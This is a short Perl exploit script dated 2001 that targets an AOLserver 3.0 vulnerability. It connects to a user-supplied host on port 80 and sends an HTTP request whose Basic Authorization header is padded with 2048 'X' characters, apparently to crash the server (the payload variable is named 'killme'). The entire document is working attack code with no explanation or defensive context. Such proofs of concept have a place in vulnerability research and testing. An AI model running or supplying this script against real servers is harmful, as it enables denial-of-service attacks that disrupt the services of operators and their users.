#!/usr/bin/perl

## Nate Haggard <nate@securitylogics.com>
## AOLserver 3.0 vulnerability
## August 22, 2001

use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto     => "tcp",
                                 PeerAddr  => $host,
                                 PeerPort  => "http(80)",
                                 );
unless ($remote) { die "cannot connect to http daemon on $host\n" }

$junk = "X" x 2048;
$killme = "GET / HTTP/1.0\nAuthorization: Basic ".$junk."\r\n\r\n";
$remote->autoflush(1);
print $remote $killme;
close $remote;
